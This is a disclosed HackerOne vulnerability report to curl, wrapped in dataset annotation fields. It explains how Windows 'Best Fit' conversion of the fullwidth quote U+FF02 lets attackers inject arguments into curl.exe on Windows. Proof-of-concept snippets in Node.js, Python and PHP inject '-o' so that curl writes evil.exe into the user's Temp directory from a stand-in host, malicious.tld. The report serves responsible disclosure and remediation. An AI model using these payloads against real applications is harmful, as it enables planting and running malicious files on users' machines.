{
  "reported_to": "curl",
  "reported_by": "splitline ",
  "title": "Unicode-to-ASCII conversion on Windows can lead to argument injection and more",
  "content": "\nHello cURL team,\nI am splitline from DEVCORE Research Team. We recently found a vulnerability on cURL. We have reproduced the issues in the latest version of cURL (curl-8.8.0_1) and would like to report it to you. Please check the attached document for details.\nThis advisory is in accordance with our vulnerability disclosure policy, which will be publicly disclosed after 90 days. Our aim is to ensure that vulnerabilities can be patched in a timely manner. Although it\u2019s not a hard deadline, we still hope you can fix this vulnerability before September 11, 2024.\nPlease let me know if you have any questions, thanks!\nSummary\nWe noticed that the misuse of the Windows ANSI API in cURL could result in unexpected argument parsing behaviour for cURL. This could consequently lead to argument injection when invoking the curl.exe from the command line.\nAffected Environment\nOperation System: Microsoft Windows\nTested on Windows 10/11, should also work on most of the versions.\nTested on Windows 10/11, should also work on most of the versions.\nLanguage (system locale):\nCP874: Thai\nCP1250: Central European language (e.g. English, German, Polish)\nCP1251: Cyrillic\nCP1252: Western European language (e.g. English, Spanish, French)\nCP1253: Greek\nCP1254: Turkish\nCP1255: Hebrew\nCP1256: Arabic\nCP1257: Baltic\nCP1258: Vietnamese\n(Does NOT affect Chinese, Japanese and Korean)\nCP874: Thai\nCP1250: Central European language (e.g. English, German, Polish)\nCP1251: Cyrillic\nCP1252: Western European language (e.g. English, Spanish, French)\nCP1253: Greek\nCP1254: Turkish\nCP1255: Hebrew\nCP1256: Arabic\nCP1257: Baltic\nCP1258: Vietnamese\n(Does NOT affect Chinese, Japanese and Korean)\nDescription\nFirstly, on Windows, command line arguments are passed as a string and are parsed by the executable itself. In contrast, on Linux, arguments are always passed to the executable as an array of strings.\nSecondly, Windows exists a behavior known as \"Best Fit\" encoding conversion[1][2]. This occurs when Windows needs to convert characters between Unicode UTF-16 (WideChar) and ANSI (MultiByte). For instance, if a Unicode character \uff02 (U+FF02, fullwidth double quote) is passed as an argument but received with the GetCommandLineA ANSI API, in certain system locales, it will trigger the \"best fit\" behavior and convert this Unicode UTF-16 character into \" (0x22, double quote).\nHere in our case, curl.exe receives the command line string using ANSI API. So if you pass some Unicode characters into those executables, it will be converted to another character, which leads to an unexpected argument parsing result in the end.\nExamples / Step to reproduce\nBefore we start, we need to make sure the Windows system locale is configured to any of the following language types: Central European, Western European, Greek, Hebrew, Baltic, Cyrillic, Arabic, Turkish, Vietnamese or Thai. You can check your codepage by the following command:\nCode 56 Bytes\n1powershell.exe [Console]::OutputEncoding.WindowsCodePage\nIf your computer is currently not configured to that language, here are the detailed steps to do the configuration (for Windows 11):\nGo to \"Settings\" > \"Time & Language\" > \"Language & Region\"\nClick the \"Administrative language settings\" item (in the \"Related settings\" section)\nIn the \"Language for non-Unicode programs\" section, click the \"Change system locales\" button. Set the system locale to any of the languages we mentioned. Here we can take \"English (United States)\" as an example. (Remember to restart your machine)\nCheck the codepage again with the command we mentioned: powershell.exe [Console]::OutputEncoding.WindowsCodePage. It should be 1252 if you chose \"English (United States)\".\nHere we opt for Node.js, Python and PHP as some examples.\nIn the subsequent three scenarios, where argument escaping or argument separating could fail, leading to argument injection. Furthermore, there's also the potential for executing arbitrary commands. As an illustration, we simply demonstrate by writing file into temp directory.\nEnsure to substitute malicious.tld and <username> in the following scripts with a appropriate values on your system. In this context, malicious.tld denotes a domain or website controlled by a malicious actor, while <username> represents the username of the current user.\nIn Node.js:\nCode 281 Bytes\n1const child_process = requite('child_process');\n2const arg = \"name=meow\\u{FF02} malicious.tld \\u{FF02}-o-\\u{FF02} \\u{FF02}-o ..\\..\\..\\..\\..\\..\\..\\..\\..\\\\Users\\\\<username>\\\\AppData\\\\Local\\\\Temp\\\\evil.exe\";\n3child_process.spawnSync(\"curl.exe\", [\"https://example.com/\", \"--data\", arg]);\nIn Python:\nCode 226 Bytes\n1import subprocess\n2arg = \"name=meow\\uFF02 malicious.tld \\uFF02-o-\\uFF02 \\uFF02-o ..\\..\\..\\..\\..\\..\\..\\..\\..\\\\Users\\\\<username>\\\\AppData\\\\Local\\\\Temp\\\\evil.exe\"\n3subprocess.run(['curl.exe', \"https://example.com/\", \"--data\", arg])\nIn PHP:\nCode 321 Bytes\n1define(\"arg\", \"name=meow\\u{FF02} malicious.tld \\u{FF02}-o-\\u{FF02} \\u{FF02}-o ..\\..\\..\\..\\..\\..\\..\\..\\..\\\\Users\\\\<username>\\\\AppData\\\\Local\\\\Temp\\\\evil.exe\");\n2proc_open(['curl.exe', \"https://example.com/\", \"--data\", arg], [], $pipes);\n3// or\n4system(sprintf(\"curl.exe https://example.com/ --data %s\", escapeshellarg(arg)));\nFor the 3 preceding instances, they all result in the following parsing result in command line and curl.exe:\nIn command line:\nCode 593 Bytes\n1                                     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n2curl.exe https://example.com/ --data \"name=meow\uff02 malicious.tld \uff02-o-\uff02 \uff02-o ..\\..\\..\\..\\..\\..\\..\\..\\..\\Users\\<username>\\AppData\\Local\\Temp\\evil.exe\"\n3                                     \u2191         \u2191                \u2191    \u2191  \u2191                                                                          \u2191\n4                                    0x22     U+FF02              U+FF02                                                                          0x22\nIn curl.exe\nCode 595 Bytes\n1                                     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u250c\u2500\u2500\u2500\u2500\u2510 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n2curl.exe https://example.com/ --data \"name=meow\uff02 malicious.tld \uff02-o-\uff02 \uff02-o ..\\..\\..\\..\\..\\..\\..\\..\\..\\Users\\<username>\\AppData\\Local\\Temp\\evil.exe\"\n3                                     \u2191         \u2191                \u2191    \u2191  \u2191                                                                          \u2191\n4                                    0x22      0x22             0x22  0x22                                                                          0x22\nNotice that U+FF02 isn't the only character that can be converted to a double quote; it's simply one example among many. For the full conversion tables, we can refer to the document from Unicode.Org. Consequently, given this characteristic, it becomes exceedingly challenging for other programming languages to adequately handle argument escaping.\nSuggested Remediation\nAvoid the using of the ANSI Windows API to get and parse the command line.\nIf you didn't explicitly use the ANSI Windows API, it might be used by the compiler or standard library itself, there are several ways to hint the compiler to use UTF-16 (WideChar) API.\nUse wmain function as the main function: https://learn.microsoft.com/en-us/cpp/c-language/using-wmain?view=msvc-170\nUse the -municode flag while compiling: https://sourceforge.net/p/mingw-w64/wiki2/Unicode%20apps/\nUse wmain function as the main function: https://learn.microsoft.com/en-us/cpp/c-language/using-wmain?view=msvc-170\nUse the -municode flag while compiling: https://sourceforge.net/p/mingw-w64/wiki2/Unicode%20apps/\nCredit Discovery To\nOrange Tsai (@orange_8361) and splitline (@splitline) from DEVCORE Research Team\nImpact\nIf an application invokes the curl.exe from the command line, and any part of an argument can be controlled by a user then it can lead to argument injection.\n\n",
  "severity": [
    8.2,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Encoding Error"
  ],
  "screenshots": {},
  "disclosed_date": 1718722320,
  "report_url": "https://hackerone.com/reports/2550951",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Configure Windows system locale to a language that triggers 'Best Fit' encoding (e.g., English (United States) for CP1252)"
    ],
    [
      2,
      "Execute a script (Node.js, Python, or PHP) that passes a crafted Unicode argument (U+FF02) to curl.exe, which gets converted to a double quote (0x22) due to the 'Best Fit' behavior"
    ]
  ],
  "vuln_description": "The vulnerability involves the misuse of Windows ANSI API in cURL, where Unicode characters (like U+FF02) passed as arguments are converted to ASCII characters (like double quotes) in certain system locales. This conversion can lead to argument injection when curl.exe is invoked from the command line, potentially allowing arbitrary command execution.",
  "reason": "The attack requires understanding of Windows' 'Best Fit' encoding behavior, specific system locale configurations, and how cURL processes command-line arguments. The interaction between Unicode-to-ASCII conversion and argument parsing in cURL is subtle and non-obvious.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}